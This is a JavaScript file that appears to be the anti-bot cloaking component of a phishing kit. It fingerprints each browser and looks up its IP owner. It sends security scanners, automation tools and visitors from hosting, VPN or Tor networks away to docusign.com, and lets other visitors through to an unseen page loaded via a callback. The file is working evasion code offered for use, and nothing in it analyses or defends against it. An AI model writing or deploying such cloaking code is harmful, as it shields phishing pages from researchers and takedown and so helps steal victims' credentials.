async function getVisitorIP() {
    const apis = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://ipapi.co/ip',
        'https://api.ip.sb/ip',
        'https://checkip.amazonaws.com'
    ];

    for (const api of apis) {
        try {
            let ip;
            if (api.includes('ipify')) {
                const data = await fetch(api).then(r => r.json());
                ip = data.ip;
            } else if (api === 'https://checkip.amazonaws.com') {
                ip = await fetch(api).then(r => r.text()).then(t => t.trim());
            } else {
                ip = await fetch(api).then(r => r.text()).then(t => t.trim());
            }
            if (ip && ip !== '0.0.0.0' && /^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
                return ip;
            }
        } catch (e) {
            continue;
        }
    }
    return '0.0.0.0';
}

function blockAccess(reason = "Access denied") {
    const redirectUrl = window.config ? window.config.redirectUrl : "https://www.docusign.com";
    window.location.href = redirectUrl;
}

async function checkAntiBot() {
    const bot_protect = window.config ? window.config.bot_protect : "on";
    const userAgent = window.config ? window.config.userAgent : "on";
    const block_ua = window.config ? window.config.block_ua : "on";
    const block_isp = window.config ? window.config.block_isp : "on";
    const block_vpn = window.config ? window.config.block_vpn : "on";
    const block_proxy_rdp = window.config ? window.config.block_proxy_rdp : "on";
    
    if (bot_protect !== "on") {
        window.antibotCheckComplete = true;
        if (typeof window.onAntiBotComplete === 'function') {
            window.onAntiBotComplete();
        }
        return true;
    }

    let ip = await getVisitorIP();
    const ua = navigator.userAgent || '';
    const uaLower = ua.toLowerCase();

    if (userAgent === "on" && !ua) {
        blockAccess("No user agent");
        return false;
    }

    if (block_ua === "on") {
        const botPatterns = [
            'bot', 'crawl', 'spider', 'scrape', 'curl', 'wget', 'python', 'java',
            'perl', 'ruby', 'go-http', 'scrapy', 'httpclient', 'okhttp', 'axios',
            'postman', 'insomnia', 'fiddler', 'burp', 'nikto', 'nmap', 'scan',
            'check', 'monitor', 'test', 'benchmark', 'siege', 'ab', 'jmeter'
        ];

        for (const pattern of botPatterns) {
            if (uaLower.includes(pattern)) {
                blockAccess("Suspicious user agent: " + pattern);
                return false;
            }
        }
    }

    if (!navigator.cookieEnabled) {
        blockAccess("Cookies disabled");
        return false;
    }

    if (!window.localStorage || !window.sessionStorage) {
        blockAccess("Storage not available");
        return false;
    }

    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        if (!ctx) {
            blockAccess("Canvas not available");
            return false;
        }
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas fingerprint', 2, 2);
        if (!canvas.toDataURL || !canvas.toDataURL().length) {
            blockAccess("Canvas toDataURL failed");
            return false;
        }
    } catch (e) {
        blockAccess("Canvas test failed");
        return false;
    }

    if (block_vpn === "on" || block_proxy_rdp === "on") {
        try {
            if (!ip || ip === '0.0.0.0') {
                ip = await getVisitorIP();
            }
            if (ip && ip !== '0.0.0.0') {
                const ipApis = [
                    `https://ipapi.co/${ip}/json/`,
                    `https://ip-api.com/json/${ip}`,
                    `https://ipinfo.io/${ip}/json`
                ];
                
                let ipData = null;
                for (const ipApi of ipApis) {
                    try {
                        const ipResponse = await fetch(ipApi);
                        ipData = await ipResponse.json();
                        if (ipData && (ipData.org || ipData.isp || ipData.asn)) {
                            break;
                        }
                    } catch (e) {
                        continue;
                    }
                }
                
                if (!ipData) {
                    return true;
                }
                
                const orgText = (ipData.org || ipData.isp || ipData.asn || '').toLowerCase();
                
                if (block_isp === "on" && orgText) {
                    const hostingProviders = [
                        'amazon', 'aws', 'google', 'google cloud', 'cloud', 'azure', 'digitalocean',
                        'linode', 'ovh', 'hetzner', 'vultr', 'contabo', 'scaleway', 'kimsufi',
                        'online.net', 'serverloft', 'hosthatch', 'ramnode', 'bhost', 'vpn',
                        'proxy', 'tor', 'datacenter', 'hosting', 'server', 'vps', 'dedicated'
                    ];

                    for (const provider of hostingProviders) {
                        if (orgText.includes(provider)) {
                            blockAccess("Hosting provider: " + provider);
                            return false;
                        }
                    }
                }

                if (block_vpn === "on" && orgText) {
                    if (orgText.includes('vpn') || orgText.includes('proxy') || orgText.includes('tor')) {
                        blockAccess("VPN/Proxy detected");
                        return false;
                    }
                }
            }
        } catch (e) {
        }
    }

    return true;
}

(async function() {
    const passed = await checkAntiBot();
    if (!passed) {
        return;
    }
    window.antibotCheckComplete = true;
    if (typeof window.onAntiBotComplete === 'function') {
        window.onAntiBotComplete();
    }
})();
